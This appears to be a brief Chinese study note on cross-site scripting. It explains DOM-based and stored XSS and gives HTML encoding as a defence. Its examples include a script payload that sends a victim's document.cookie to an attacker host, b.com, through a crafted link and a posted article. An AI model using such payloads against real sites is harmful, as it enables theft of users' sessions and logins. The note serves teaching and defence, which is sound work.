XSS'Cross SiteScript'跨站脚本攻击 
  PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
    理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
  原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
    当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
    如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
  DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
    Example:
      如一个获取他人Cookie的超链接,
      'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
      当点击这个链接的时候[假设点击者已经登录a.com],浏览器就会直接打开b.com,
      并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
      当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
      cookie信息中可能存有登录密码,攻击成功！
  Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
    Example:
      a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
      <script>window.open(“www.b.com?param=”+document.cookie)</script>,
      保存文章,这时当在查看攻击者的文章时就都中招了,
      他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
  XSS防御 
    永远不相信用户的输入,输入验证
    Html encode,对标签进行转换
      比如输入:'<script>window.location.href=”http://www.baidu.com”;</script>',
      最终存储的会是:
      '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
      在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
